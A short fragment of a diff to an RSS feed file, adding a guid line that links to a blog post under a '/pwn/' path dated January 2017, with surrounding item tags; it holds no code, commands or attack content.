+				<guid isPermaLink="true">/pwn/2017/01/25/easy_method.html</guid>
 			</item>
 		
 			<item>
